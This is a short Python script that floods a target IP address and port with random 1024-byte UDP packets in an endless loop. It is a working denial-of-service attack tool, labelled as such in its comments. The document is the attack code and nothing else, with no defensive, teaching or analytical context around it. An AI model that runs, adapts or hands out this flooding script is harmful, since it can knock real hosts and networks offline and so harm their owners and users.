import socket
import random

target_ip = "192.168.1.1" # the IP address of the target
target_port = 80 # the port to attack

# creates a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# creates a payload to send to the target
payload = random._urandom(1024)

# continuously sends packets to the target
while True:
    sock.sendto(payload, (target_ip, target_port))
